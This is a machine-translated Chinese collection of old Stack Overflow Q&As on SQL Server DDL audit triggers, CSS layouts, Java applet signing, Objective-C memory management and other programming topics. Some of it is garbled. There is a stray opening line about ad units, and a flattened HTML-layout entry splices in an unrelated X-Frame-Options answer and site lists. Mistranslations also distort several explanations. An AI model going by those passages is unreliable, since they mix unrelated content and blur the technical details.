如果您网页上的广告单元显示为空白，则很可能是因为没有匹配的订单项...确保您使用的是 DFP 中的构建标记工具...这还没有让我失望...还可以查看[调试控制台](https://support.google.com/dfp_sb/bin/answer.py?hl=en&answer=181070)，这应该会显示您的页面出现的任何错误。

# sql-server - 如何在Sql Server 中跟踪表结构的变化

> ID：12192379
> 
> 赞同：5
> 
> 时间：2012-08-30T07:58:34.787
> 
> 标签：sql-server, database, audit

我有一个包含三列（姓名、年龄、城市）的表。现在，如果某个时候有人在表格中添加了一个额外的列（国家）。我如何知道哪一列已添加到表中，即国家/地区。

每当有人更改表结构时，有什么方法可以跟踪表结构的变化？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-02-28T10:57:25.920

SQL Server DDL 触发器可用于跟踪 DDL 更改，无论更改是有意的还是意外的。谁提交了更改，何时提交以及受提交操作影响的内容是需要使用触发器捕获的基本信息。要使用此解决方案，需要创建和维护触发器和捕获的信息存储

在以下示例中，使用 SQL Server 的 EVENTDATA() 函数捕获有关触发触发器的事件的信息。SQL 脚本创建 DDL 触发器，该触发器在数据库级别捕获 CREATE、ALTER 和 DROP 事件（尽管可以在服务器级别创建触发器以捕获服务器上所有数据库的事件；应使用 ON ALL SERVER 选项，而不是在数据库上）：

```
CREATE TRIGGER Audit_DDL
ON DATABASE
    FOR CREATE_TABLE, ALTER_TABLE, DROP_TABLE
AS
     DECLARE
        @event xml;
     SET
     @event = EVENTDATA();
     INSERT INTO Audit_DDL_Events
     VALUES
     (
     REPLACE(CONVERT(varchar(50),
     @event.query('data(/EVENT_INSTANCE/PostTime)')), 'T', ' ')
     ,
     CONVERT(varchar(150),
     @event.query('data(/EVENT_INSTANCE/LoginName)'))
     ,
     CONVERT(varchar(150),
     @event.query('data(/EVENT_INSTANCE/UserName)'))
     ,
     CONVERT(varchar(150),
     @event.query('data(/EVENT_INSTANCE/DatabaseName)'))
     ,
     CONVERT(varchar(150),
     @event.query('data(/EVENT_INSTANCE/SchemaName)'))
     ,
     CONVERT(varchar(150),
     @event.query('data(/EVENT_INSTANCE/ObjectName)'))
     ,
     CONVERT(varchar(150),
     @event.query('data(/EVENT_INSTANCE/ObjectType)'))
     ,
 CONVERT(varchar(max),
 @event.query('data(/EVENT_INSTANCE/TSQLCommand/CommandText)'))
 ); 
```

还必须为来自 EVENTDATA XML 的审计数据创建一个适当的存储表：

```
CREATE TABLE Audit_DDL_Events
(
             DDL_Event_Time            datetime
             ,
             DDL_Login_Name            varchar(150)
             ,
             DDL_User_Name             varchar(150)
             ,
             DDL_Database_Name         varchar(150)
             ,
             DDL_Schema_Name           varchar(150)
             ,
             DDL_Object_Name           varchar(150)
             ,
             DDL_Object_Type           varchar(150)
             ,
             DDL_Command              varchar(max)
); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:02:17.813

您可以使用 DDL 触发器来跟踪数据库结构的更改。可以在[此处](http://porchelvi.wordpress.com/2009/01/16/triggers-in-sql-server/)找到有关该主题的好文章。

## 第三方编辑

引用链接的文章

> DDL 触发器...触发存储过程以响应事件。它们响应各种数据定义语言 (DDL) 事件而触发。这些事件由以关键字 CREATE、ALTER 和 DROP 开头的 T-SQL 语句指定。...这些用于管理任务，如审计和调节数据库操作。

# css - 具有固定宽度和扩展列的复杂表格布局

> ID：12192380
> 
> 赞同：0
> 
> 时间：2012-08-30T07:58:36.943
> 
> 标签：css, tablelayout, fluid-layout, fixed-width

我有一个复杂的表格布局（[jsfiddle](http://jsfiddle.net/RVSbJ/)）。这是一份很长的报告，有很多部分，每个部分都有一个表格。

表格的前两列应该有一个固定的宽度，以确保它们很好地对齐。

第三列应该增长到适合其中的文本而不换行（它总是一个单词）。

最后一列应始终填充剩余空间。

当我只指定前两列的宽度并将最后一列的宽度设为 100% 时，最后一列会填充可用空间（很好），但前两列的宽度会被忽略。

当我给 table`table-layout: fixed;`时，前两列的宽度有效，但最后两列占用相同的屏幕空间，因为我不能给第三列一个固定的宽度。

有解决方案吗？

注意：该解决方案不需要在 IE 上工作！FF 12+ 和 Chome 21+ 就足够了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:10:15.670

# java - 如何使用 Apple Developer ID 签署 Java 小程序

> ID：12192382
> 
> 赞同：1
> 
> 时间：2012-08-30T07:58:45.367
> 
> 标签：java, applet, code-signing, osx-mountain-lion, osx-gatekeeper

我有使用 thwate 证书签名的 java 小程序，需要使用 Apple Developer ID 对其进行签名。

众所周知，Mac OS X 10.8 要求 Java 应用程序使用 Apple Developer ID 进行签名。它会导致运行 Java 小程序时出现一些问题，Gatekeeper 说“无法验证数字签名”。[OS X 10.8 Gatekeeper and Java applet](https://stackoverflow.com/questions/11665386/os-x-10-8-gatekeeper-and-java-applets)和Sign java applet存在相同的问题[，以便它可以在 OS X 10.8 Mountain Lion 和 Windows 上运行](https://stackoverflow.com/questions/12088680/sign-java-applet-so-that-it-works-on-os-x-10-8-mountain-lion-and-windows)

我还在 Oracle 的 Mac 常见问题解答中找到了这一点：http: [//docs.oracle.com/javase/7/docs/technotes/guides/jweb/mac-faq.html#gatekeeper](http://docs.oracle.com/javase/7/docs/technotes/guides/jweb/mac-faq.html#gatekeeper)

因此，我请求并将 Apple Developer ID 证书下载到我的 Mac 上，但我找不到任何如何使用 Apple Developer ID 签署 Java 小程序的地方。

我尝试了以下方法：

1.  **使用协同设计**工具在 Mac 上对小程序进行签名。

    ```
    codesign -s "Developer ID Application: MyCompany" MyApplet.jar 
    ```

    但是这个命令实际上并没有修改 jar 文件（没有更改日期、文件大小或二进制内容）。

2.  将 Apple 证书导出到 p12 并使用**jarsigner**。我将**Apple Root CA**、**Apple Timestamp Certification Authority**和**Developer ID Application: MyCompany**导出到 p12 并以通用方式签署我的 jar。

3.  将我的 thawte 证书导入 Mac Keychain Access 并将 Apple 和 thawte 证书导出到 p12。

这三种方式都没有给我任何东西。当我用小程序打开一个页面时，Gatekeeper 仍然说无法验证。

任何人都可以向我提供有关如何签署我的小程序的分步说明吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-03T03:53:23.507

哦，没办法=（Java小程序不能参与Developer ID计划。Apple的答案在这里[https://stackoverflow.com/a/12210534/1068878](https://stackoverflow.com/a/12210534/1068878)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-04-22T13:15:50.623

这对您来说可能有点晚了，但如果它对其他人有帮助：可以将 JAR 文件与 Java 运行时环境一起捆绑到 .app 中。然后，您可以使用您的 Apple 证书对 .app 进行签名，就像您使用 xcode 编写的一样。搜索“javapackager”（这只是执行此操作的众多方法之一）。理论上你甚至可以将这样的应用提交到应用商店。

# sql - 为表的每个值加入一个带有函数结果的表

> ID：12192383
> 
> 赞同：1
> 
> 时间：2012-08-30T07:58:49.800
> 
> 标签：sql, sql-server

我有一张由几个像这样的 Id 组成的表

```
SELECT * FROM Objects;

ObjectId
---------
    1
    4
    5 
```

和为每个 ObjectId 生成另一个表的函数，例如

```
SELECT * FROM dbo.GetNumbers(1)        SELECT * FROM dbo.GetNumbers(4)       SELECT * FROM dbo.GetNumbers(5) 

NumberId                               NumberId                              NumberId
---------                              ---------                             ---------
    40                                     11                                    12
    45                                     2                                    
                                           18 
```

如何在**不使用游标**的情况下使用函数生成的表获得原始表的笛卡尔积？

```
 SELECT ???

    ObjectId    NumberId
    ---------------------
        1           40
        1           45
        4           11
        4           2
        4           18
        5           12 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:09:23.140

由此判断`dbo.`可能是 Sql Server，在这种情况下，[外部应用](http://msdn.microsoft.com/en-us/library/ms175156%28v=sql.105%29.aspx)可能会有所帮助：

```
select objects.ObjectID,
       numbers.NumberID
  from objects
 outer apply 
 (
   SELECT * 
     FROM dbo.GetNumbers(objects.objectid)
 ) numbers 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T08:17:18.957

你不想[做](http://msdn.microsoft.com/en-us/library/ms175156%28v=sql.105%29.aspx)吗？

```
SELECT
              o.ObjectId
            , n.NumberId
   FROM
            Objects o
       CROSS APPLY
            dbo.GetNumbers(o.ObjectId) n 
```

如果您想包含`Objects`没有`GetNumbers`结果的内容，请使用`OUTER APPLY`.

一种简单的看待方式是，[`CROSS APPLY`](http://msdn.microsoft.com/en-us/library/ms175156%28v=sql.105%29.aspx)is an [`INNER JOIN`](http://msdn.microsoft.com/en-us/library/ms190014%28v=sql.105%29.aspx)to a [TVF](http://msdn.microsoft.com/en-us/library/ms191165%28v=sql.105%29.aspx)，[`OUTER APPLY`](http://msdn.microsoft.com/en-us/library/ms175156%28v=sql.105%29.aspx)is a [`LEFT OUTER JOIN`](http://msdn.microsoft.com/en-us/library/ms187518%28v=sql.105%29.aspx)to a [TVF](http://msdn.microsoft.com/en-us/library/ms191165%28v=sql.105%29.aspx)。

[`CROSS JOIN`](http://msdn.microsoft.com/en-us/library/ms190690%28v=sql.105%29.aspx)您不应该将这些与与函数无关并用于提供两组[笛卡尔积](http://en.wikipedia.org/wiki/Cartesian_product)的混淆，这不是您想要的。

# html - 我可以建立一个网页 而不是仍然在几个区域中拆分页面？ 我正在制作一个需要标题（顶部）和左对齐菜单（标题下方）以及该菜单右侧的内容的网页。 我面临的问题是我想使用（使用元素和浮动）而不是创建页面的结构但是，每当我调整浏览器窗口的大小时，内容元素都会在菜单下浮动。我希望内容贴在左侧浮动菜单的右侧。 有人知道我该如何解决这个问题吗？ 我的 html 代码有这样的结构：[menu #1](#) ... ... ...text or whatnot...Css 文件如下所示： #menu { width: 200px; float: left; } #subcontent { width: 800px; float: left; } PS 我尝试将像素更改为 % 但没有运气。 尝试发送另一个 X-Frame-Options 标头，添加 到您的页面顶部。它应该禁用 SAMEORIGIN 命令。 htmlcss 4 2 回答 2 This answer is useful 2 CSS #layout { min-width: 1001px; } #menu { width: 200px; float: left; } #subcontent { width: 800px; float: left; } .clear-both { clear: both; font: 1px/1px monospace; display: block; } HTML[menu #1](#) ... ... ...text or whatnot...另一种解决方案： CSS #layout { display: table; width: 1000px; /* set it to 100% if #subcontent width is dynamic */ } #menu { width: 200px; display: table-cell; } #subcontent { width: 800px; /* you can remove the width to make it dynamic */ display: table-cell; } HTML[menu #1](#) ... ... ...text or whatnot...于 2012-08-30T08:12:20.253 回答 This answer is useful 1 您将需要一个外部容器。 只需尝试将两个元素包装在宽度为 1000px 的 div 中[menu #1](#).outer{width: 1000px;} #menu { width: 200px; float: left; } #subcontent { vertical-align: top; width: 800px; float: left; } 于 2012-08-30T08:07:49.213 回答 Related 1 javascript - 如何在dimple.js中旋转x轴文本？ 2 c# - 类型定义存在于两个库中 2 ms-access - 外循环运行 1 次 VBA 2 scala - 使用动态过滤器参数过滤列表 3 sql - SQL QUERY Oracle 日志分析 2 javascript - 列范围上的 Highcharts minPointLength 不起作用 1 c# - 如何在 C# 中添加“样式化”文档工具提示？ 1 mysql - 由于 WHERE MySQL Crystal Reports 动态更改数据库 0 sencha-touch - 在 sencha touch 中打开 Excel 文件 3 sql-server - 如果值为 0.000000，则将十进制值转换为 NULL Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：12192384
> 
> 赞同：0
> 
> 时间：
> 
> 标签：html, css

我正在制作一个需要标题（顶部）和左对齐菜单（标题下方）以及该菜单右侧的内容的网页。

我面临的问题是我想使用（使用元素和浮动）而不是创建页面的结构但是，每当我调整浏览器窗口的大小时，内容元素都会在菜单下浮动。我希望内容贴在左侧浮动菜单的右侧。

有人知道我该如何解决这个问题吗？

我的 html 代码有这样的结构：

```
 <div id="menu">
    <a href="#">menu #1</a>
    ...
    ...
    ...
 </div>
 <div id="subcontent">
    text or whatnot...
 </div> 
```

Css 文件如下所示：

```
 #menu
 {
    width: 200px;
    float: left;
 }

 #subcontent
 { 
      width: 800px;
      float: left;   
 } 
```

PS 我尝试将像素更改为 % 但没有运气。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:12:20.253

CSS

```
#layout {
    min-width: 1001px;
}

#menu {
    width: 200px;
    float: left;
}

#subcontent {
    width: 800px;
    float: left;
}

.clear-both {
    clear: both;
    font: 1px/1px monospace;
    display: block;
} 
```

HTML

```
<div id="layout">
  <div id="menu"> <a href="#">menu #1</a> ...
    ...
    ... </div>
  <div id="subcontent"> text or whatnot... </div>
  <div class="clear-both"></div>
</div> 
```

另一种解决方案：

CSS

```
#layout {
    display: table;
    width: 1000px; /* set it to 100% if #subcontent width is dynamic */
}

#menu {
    width: 200px;
    display: table-cell;
}

#subcontent {
    width: 800px; /* you can remove the width to make it dynamic */
    display: table-cell;
} 
```

HTML

```
<div id="layout">
  <div id="menu"> <a href="#">menu #1</a> ...
    ...
    ... </div>
  <div id="subcontent"> text or whatnot... </div>
</div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:07:49.213

您将需要一个外部容器。

只需尝试将两个元素包装在宽度为 1000px 的 div 中

```
<div class="outer">
    <div id="menu">
        <a href="#">menu #1</a>   
    </div>
    <div id="subcontent">    
    </div>
</div>

.outer{width: 1000px;}
#menu
{
    width: 200px;
    float: left;
}

#subcontent
{ 
    vertical-align: top;
    width: 800px;
    float: left;   
} 
```

# c++ - 如果不使用 C++11，Anthony William 的“C++ Concurrency in action”是一本合适的书吗？

> ID：12192387
> 
> 赞同：16
> 
> 时间：2012-08-30T07:59:04.477
> 
> 标签：c++, concurrency, c++11

我愿意从并发中学习更多，我发现这本书有很多好评。但是看了前言，恐怕它非常关注仅包含在 C++11 中的 STD 函数。

由于 C++11 还不是很常用，而且在我的工作场所根本没有，我需要知道在我应该阅读另一本书时阅读这本书是否会浪费时间。

我专注于 Windows 开发，但我喜欢在 UNIX 和 Windows 中使用标准库。对这本书有什么建议或说明吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-30T08:05:32.973

不，本书大量使用 C++11 语法。

书中讨论的东西也不仅仅是 C++11 库特性，例如 C++11 内存模型是 C++11 中的一个全新事物（c++98 不承认 MT 的存在）。

仍然恕我直言，您应该从以下位置获得超级容易安装的 g++4.9+boost：nuwen.net 或者只是获得 VS 2013 社区。

因为 C++11 是标准，我猜你很快就会开始在你的工作场所使用它（如果不是引用 Andrei Alexandrescu 的话：“打电话给你的猎头！”）。顺便说一句`std::thread`，`boost::thread`它们非常相似，但有显着差异。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-30T08:05:24.830

你说得对，它主要关注 C++11。正如副标题所暗示的那样，它是“实用的多线程”。

如果您不使用 C++11，您可能会感兴趣的唯一方法是您计划使用 boost 线程，这是 C++11 线程的基础。但是你必须知道它们并不完全相同，因为 C++11 做了一些改变。（例如，在 C++11 中，您必须决定是等待线程完成还是让它自行运行。在 boost 中，默认情况下它会自行运行。如果您不在 C++11 中选择，您的程序将终止）。

然后，对于您作为对其领域感兴趣的 C++ 开发人员的一般知识，推荐阅读。C++11 书籍目前还不是很多。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-23T06:35:43.970

自从

*   你正在寻找一本关于并发阅读的书
*   你想使用一个可以在 windows 和 unix 上运行的库
*   你想使用 C++ 但不是 C++11

您可能需要使用 Boost.Thread。

那时你会读这本书有一些原因：

*   我不知道关于 Boost 线程的书
*   本书作者多年来一直是 Boost.Thread 的主要开发者和维护者
*   C++11 线程很像 Boost 线程（作者写道：“本书中的大多数示例都可以修改为与 Boost 线程库一起使用，方法是明智地将 std:: 替换为 boost:: 并使用适当的#include 指令。”）

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-08-30T08:07:07.690

将在整整两周后发布的下一代 Visual C++ 包含`std::thread`库，如果我没记错的话，G++ 已经包含库了。我不会把它算在内。事情是这样的：C++11 真的非常重要。如果您的工作场所不打算迁移，我会寻找另一个工作场所。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-30T08:17:16.567

我认为即使您不了解多线程的东西，这也是一本非常有趣的书。就像在一个结构中创建两个互斥锁一样，当您从两个内核切换到两个处理器时会出现问题。还有很多设计模式。从这本书中，您将通过示例了解什么是 ABA 问题等。此外，boost 线程（不需要 c++11x）与 c++11 线程非常相似。你会坚持使用 smart_ptrs，也许是 sink 模式，RAII 等等。这是一本很棒的书。

请注意，即使现​​在并非所有功能都在示例 G++ 中实现。[http://gcc.gnu.org/projects/cxx0x.html](http://gcc.gnu.org/projects/cxx0x.html)

老实说，您肯定会开始学习新的 c++，但您何时必须接触它只是时间问题。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-30T08:48:52.450

我没有读过这本书，但是如果你对并发不清楚，那么首先要做的是阅读、使用和理解*一个*多线程系统。

然后对另一个系统执行相同的操作，并仔细注意与您已经知道的系统的差异。当您发现差异时，请开始阅读以了解许多不同的系统如何处理该方面的并发性。

如果您目前正在开发多线程程序，那么您研究的第一个系统应该是您主要工作的系统，因为在您了解该系统的并发模型之前，您可能会破坏事物和/或编程复制和粘贴现有代码。所以这很可能是 Windows、pthreads、Boost、TBB 或其他已经存在的东西。不过，C++11 可能是第二个系统的有力候选者。

否则，我认为你先学习哪一个不会有太大的不同。好的 C++11 有一个小小的缺点，它除了 PDF 之外还不存在——你必须安装一些仍在快速开发中的编译器版本，并且可能`std::thread`暂时使用 Boost 线程，并且也许书中的一些代码示例无法编译，您必须解决缺少的功能。所以不要在你的工作场所尝试书中关于生产代码的实验（我的意思是，你无论如何都不会，对吧？）。

老实说，别管 C++，学习*Java*并发模型仍然是理解并发的合理起点。或者 Go：它有一些非常好的抽象，要花半天时间才能理解它的要点，它会告诉你应该如何*让*并发程序工作，假设没有丑陋的复杂性迫使你这样做。当然，您不会立即在您的专业 C++ 工作中使用 Java、Go 或 C++11 中的所有知识，但它可能仍然值得拥有。

# java - android编程中的数组

> ID：12192396
> 
> 赞同：0
> 
> 时间：2012-08-30T07:59:58.237
> 
> 标签：java, android, arrays

我是android编程的新手。这是我的问题

我试图在 onCreate() 方法之前声明一个数组，例如

```
int[] userselected; 
```

请注意，我想使用此数组来存储用户按下的按钮的 ID。然后我试图找到没有。这个数组中的元素

```
int noOfElements = userselected.length; 
```

哪个游戏我一个错误。然后我将声明更改为

```
int[] userselected = {}; 
```

它起作用了，但是当我尝试用代码在这个数组中放入一个 id 时

```
userselected[1] = R.id.textview1; 
```

它再次给了我一个错误。我也尝试将数组声明为

```
int[] userselected = new int[4]; 
```

但是，当我试图找出已经存储了多少元素时，userselected.length

总是给4号。

请告诉我，我怎样才能得到我想要的

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-30T08:04:23.077

您需要使用[ArrayList](http://developer.android.com/reference/java/util/ArrayList.html)。它将为您提供一个更灵活的结构来提供您的案例。

```
ArrayList<Integer> userselected  = new  ArrayList<Integer>();
userselected.add(R.id.textview1); //To add id.
int noOfElement = userselected.size(); //to get size 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:30:27.250

数组是**固定大小**的。所以当你声明这个数组时

`int[] userselected = new int[4]`

您正在创建一个固定大小为 4 的数组。数组索引从零开始，因此它从 [0] 到 [3]。我建议您使用 ArrayList 对象，如最佳答案状态

当你这样做时：

`int[] userselected = {};`

与此相同：

`int[] userselected = new int[0]; // empty`

`and you got an error from this:`

`int[] userselected;`

因为你没有在内存中分配任何空间

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:04:42.493

Java 原始数组（例如`int[]`）的长度是恒定的，并且包含的​​内容不能超过其初始长度。如果你需要一个可以改变大小的数组，你需要使用 fx. 一个`List`实现。我建议您在开始开发 Android 之前阅读基本的 Java，从长远来看，它会为您节省大量时间。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T08:05:29.567

我认为这个页面可以提供帮助：[http ://www.javaclass.info/classes/java-array/array-examples-demonstration-and-code-snippets.php](http://www.javaclass.info/classes/java-array/array-examples-demonstration-and-code-snippets.php)

在您所做的数组声明中，您说它的大小是 4 个元素，因此 length 方法将始终返回 4。

问候

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-30T08:06:22.053

将其声明为整数数组，然后将其添加到您的代码中

```
Integer a=0;
for (int i=0;i>userselected.length;i++)
{
   if(userselected[i]!=null)
    {
      a++;
    }
} 
```

然后`a`会给你你需要的计数:) 干杯:)

# internet-explorer - IE9 更好的开发者工具

> ID：12192397
> 
> 赞同：3
> 
> 时间：2012-08-30T08:00:01.200
> 
> 标签：internet-explorer, internet-explorer-9, ie-developer-tools

当您按下 F12 时，IE9 提供了一些开发人员工具，但这些工具并没有提供任何我感兴趣的功能。我需要一个自由更新 HTML 和 CSS 的选项，但它们让这变得很困难。

IE 有没有“萤火虫”？或者至少是 Google Chrome 之类的开发者工具。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-30T08:03:23.257

有基于 JavaScript 的 Firebug Lite，应该适用于大多数浏览器：

[http://getfirebug.com/firebuglite](http://getfirebug.com/firebuglite)

它没有提供真正的 Firebug 提供的所有工具，但它向前迈出了一步。

我还发现 IE 开发人员工具还*不错*。但是我只将它们用于跨浏览器修复。

# objective-c - 基本的内存管理混乱

> ID：12192400
> 
> 赞同：0
> 
> 时间：2012-08-30T08:00:22.140
> 
> 标签：objective-c, memory-management

我敢打赌，我可以通过阅读此处的类似主题或通过谷歌搜索找到这个问题的答案，但我想直接“听到”它可以这么说，因为这是我理解的反常现象。

所以事情是这样的，我有一些以前的员工写的代码，我看到很多特定类型的结构，这对我来说看起来很奇怪，我只想澄清什么是“对与错”。

例如

```
- (void) setWwanServiceId: (NSString *) newValue {
    [wwanServiceId autorelease];
    wwanServiceId = [newValue copy];
} 
```

这`wwanServiceId`是`NSString`班级的一名成员，对我来说，这似乎是一种奇怪的方式。据我了解，它首先会`autorelease`在对象上放置一个，基本上是说：“每当这个对象似乎不被使用时，为我释放它我并不在乎”然后副本将保留计数 +1 .... wwanServiceId？还是新价值？我猜是第一个

然后让我更加困惑，让我们快速浏览一下`wwanServiceId`-string 的生命周期..

基本上，如果我们收到一个通知，则该值将被设置，然后通知处理程序方法将调用上述`-setWwanServiceId:`方法。除此之外，它只会被访问以供阅读，所以我们可以肯定地说它会在任何给定点：

1.  将自动释放放在对象上
2.  保留一个新的字符串副本

然后还有一个怪癖，这就是我越来越怀疑的地方，即`-dealloc`看起来像这样的方法：

```
- (void) dealloc {
    [[self wwanServiceId] release];
    [super dealloc];
} 
```

那么那里会发生什么？正如我所说，它`release`的`wwanServiceId`内存管理唯一一次被触及（如果我没有错过任何东西，但我很确定）是放置一个自动释放并保留它。

所以总结一下：这里的想法是他认为因为他总是在放置自动释放后保留一个新副本，所以他需要在最后释放它..或者这是我唯一能想到的。或者只是觉得最后做一个额外的发布是安全的，以防万一..？

因为据我了解，如果此设置器被调用一次，它将放置一个`autorelease`（-1 将来），执行一个`retain`（+1），当调用析构函数时，它将执行“最终释放”（-1）。

任何帮助我理解的想法或建议（如果事实上我错了并且内存处理是正确的）将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T10:41:10.690

你写了：

> 这里 wwanServiceIdis 是类的 NSString 成员，对我来说这似乎是一种奇怪的方式。据我了解，它将首先在对象上放置一个自动释放，基本上是说：“每当这个对象似乎不被使用时，为我释放它我并不在乎”然后副本将保留计数+1 on.... wwanServiceId？还是新价值？我猜是第一个

这似乎指出了您困惑的根源。`wwanServiceId`是一个*变量*，可以包含对类型*对象的引用*`NSString`。变量没有引用计数，只有对象才有。

前员工写道：

```
- (void) setWwanServiceId: (NSString *) newValue {
   [wwanServiceId autorelease];
   wwanServiceId = [newValue copy];
} 
```

该表达式的`[wwanServiceId autorelease]`意思是：读取存储在其中的引用`wwanServiceId`并自动释放该引用所引用的对象 - 我们称该对象为 A。**重要提示**：这不会删除对象 A；它将在`release`以后的某个阶段被删除，如果那时没有剩余的引用，对象 A 将被删除。

该表达式的`[newValue copy]`意思是：读取存储在 中的引用`newValue`，使用它来定位对象（称为对象 B），复制该对象以生成新对象（称为对象 C），并返回对新对象的引用。这个新对象归 的调用者所有`copy`，因此不需要`retain`它。

最后，分配将对对象 C 的引用存储到`wwanServiceId`.

因此，最多涉及三个不同的对象：

1.  A： 引用的原始对象`wwanServiceId`，这是自动释放的以删除`wwanServiceId`.
2.  B: 引用的对象`newValue`，这个保持不变
3.  C：新创建的 B 的副本，通过`wwanServiceId`

为什么代码中的“自动释放”和上面的“最多三个不同”？

该方法可以通过`newValue`引用对象 A 来调用，例如：

[self setWwanServiceId:[self wwanServiceId]]

如果发生这种情况并且 (a)`release`被使用而不是`autorelease`(b) 没有其他对对象 A 的引用，那么`release`将删除对象 A，然后`[newValue copy]`评估时`newValue`将引用已删除的对象...`autorelease`在此使用case 将删除延迟到复制之后。

因此，前任员工所写的内容绝不是“错误的”，但正如其他一些答案所暗示的那样，这可能是一种不寻常的风格。你看到这个写的另一种方式是：

```
- (void) setWwanServiceId: (NSString *) newValue
{
   NSString *oldValue = wwanServiceId;
   wwanServiceId = [newValue copy];
   [oldValue release];
} 
```

这也确保在复制之后发生任何删除。

HTH。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T09:34:05.723

简短而有帮助：

这是错误的：

```
- (void) setWwanServiceId: (NSString *) newValue {
    [wwanServiceId autorelease];
    wwanServiceId = [newValue copy];
} 
```

这是正确的：

```
- (void) setWwanServiceId: (NSString *) newValue {
    if (newValue != wwanServiceId) {
        [wwanServiceId release];
        wwanServiceId = [newValue copy];
    }
} 
```

简而言之：

`[wwanServiceId autorelease];`是一个不必要的发送消息，因为自动释放一个对象会减少未来某个未知点的保留计数。在下一行中，您将`wwanServiceId = [newValue copy];`立即设置实例变量。**因此，在您的记忆中，您现在有一个要自动释放的对象和一个新对象。其中之一是太多**新对象是您的 IVar 的指针所指向的位置。旧的在你的记忆池中游泳，可能没有参考它:-)

尽可能少地自动释放或使用 ARC。

哦：在`dealloc`方法中，请不要这样发送消息：

```
[[self wwanServiceId] release]; 
```

最好像这样：

```
[wwanServiceId release]; 
```

正如 Apple 建议的那样，直接使用 and 方法中的实例方法`init`，`dealloc`而不是在那里使用 getter 和 setter。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:40:47.313

调试一下看看。

```
[wwanServiceId autorelease]; 
```

wwanServiceId 有一个地址。该声明不会改变它。它确实减少了这个对象的保留计数。而已。

```
wwanServiceId = [newValue copy]; 
```

此语句创建一个新对象。新对象是 newValue 的副本。比较对象的地址，您会看到，地址 inn wwanServiceId 将与 newValue 的地址不同，并且与 wwanServiceId 在语句执行前的地址不同。

隐含的保留`copy`会影响 wwanServiceId，但它会影响刚刚使用`copy`. 它不影响之前语句中自动释放的 wwanServiceId 对象。

在执行`setWwanServiceId`完成后的某个时刻，旧的和自动释放的对象将消失。（假设现在保留计数为 0。如果它 > 0 是因为它仍因其他原因或仅出于错误而保留，那么它将保留并可能导致泄漏。）

一旦你明白了，你就不会再质疑 dealloc 方法中发生了什么。`wwanServiceId`被释放。这意味着它的保留计数减少了 1。如果它是 0，那么它将被自动释放。你甚至可以在那里自动释放它。与自动释放的区别基本上是在当前方法正在执行时，自动释放的对象仍然存在并且可用。它的发布将在稍后的某个时间点生效。

但是没有理由在 dealloc 中自动释放对象。在给出的示例中，甚至没有充分的理由在 setter 中自动释放对象`setWwanServiceId`。您可以直接在这两种方法中释放对象。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T09:09:19.057

假设是由 getter和 setter`wwanServiceId`映射的私有 ivar ，我认为在 setter 中自动释放 ivar 是不正确的。我会编写以下代码：`wwanServiceId``setWwanServiceId`

```
- (void) setWwanServiceId: (NSString *) newValue {
    if (newValue != wwanServiceId) {
        [wwanServiceId release];
        wwanServiceId = [newValue copy];
    }
} 
```

我的意思是：没有必要将您的 var 的所有权授予自动释放池（它可能在应用程序结束时被耗尽）。只需释放 ivar。如果有人在使用它，没问题，它会对它有很强的引用。否则它将被释放。

# sql - Postgresql 查询建议

> ID：12192402
> 
> 赞同：0
> 
> 时间：2012-08-30T08:00:25.633
> 
> 标签：sql, postgresql, select

我需要找出在选定的一天内发表第一篇文章的人数。我有一张表，其中包含每个人发布的所有帖子。所以我的逻辑是让所有只发过一篇文章的人，而这篇文章是昨天完成的。我尝试了一些查询，但我仍然对 Postgresql 感觉不太舒服，所以请帮忙。

这些是我可用的字段：

*   用户身份
*   post_id
*   发布日期

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:01:51.027

```
SELECT user_id, min(post_date) 
from table
group by user_id
having min(post_date) = YourSelectedDate 
```

# .net - 在多个 .net 框架版本上使用 windbg

> ID：12192403
> 
> 赞同：3
> 
> 时间：2012-08-30T08:00:32.900
> 
> 标签：.net, windbg

我负责在安装在全球近 50 万台 PC 上的基于 .Net 的收缩包装桌面应用程序上从 Windows 错误报告中调试 minidump，所有这些应用程序都运行不同的操作系统版本和不同的 .Net 框架补丁版本。为此需要以下 3 个文件的匹配版本

```
sos.dll
Mscorwks.dll
Mscordacwks.dll 
```

我在过去下载 .msu 文件并从中提取这些文件方面取得了一定的成功，但我相信一定有更简单的方法。

我的问题是，是否有一个存储库可以下载这些文件的正确版本，以便调试小型转储？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T10:53:07.097

您需要更多的文件，只有这三个文件才能可靠地调试/重现/分析现场问题。基本上，您需要所有这些（Windows、CLR 和（托管）.NET 框架）。

我不知道只有一些文件的任何存储库。您必须安装相应的版本。

